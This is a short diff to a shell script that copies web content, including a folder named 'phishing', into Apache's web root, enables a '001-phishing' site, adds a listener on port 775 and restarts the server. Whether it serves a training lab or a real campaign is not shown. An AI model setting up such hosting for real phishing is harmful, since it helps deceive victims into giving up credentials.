@@ -4,6 +4,7 @@ cp ./html /var/www/
 cp ./phishing /var/www/
 cp ./000-default.conf /etc/apache2/sites-available
 cp ./001-phishing.conf /etc/apache2/sites-available
+sudo sed -i '/Listen 80/a Listen 775' /etc/apache2/ports.conf
 a2ensite 000-default
 a2ensite 001-phishing
 sudo systemctl restart apache2
